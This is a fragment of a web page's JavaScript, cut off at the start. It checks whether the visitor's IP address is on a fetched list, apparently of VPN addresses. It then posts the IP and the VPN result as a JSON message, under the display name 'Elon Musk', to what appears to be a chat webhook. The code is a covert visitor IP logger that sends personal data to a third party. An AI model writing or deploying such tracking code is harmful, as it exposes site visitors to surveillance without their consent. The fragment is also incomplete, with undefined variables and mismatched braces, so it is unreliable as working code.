<script>

        const array = data.split('\n');
        //console.log(array);
        var usedvpn = false;
        if (array.includes(userip)) {
            var usedvpn = true
        } else {

        }

      request.setRequestHeader('Content-type', 'application/json');

    const params = {
    username: "Elon Musk",
    avatar_url: "",
    content: "Did user use vpn?:" + usedvpn + "What is the ip?:" + userip
    }

    request.send(JSON.stringify(params));
}
 })
</script>
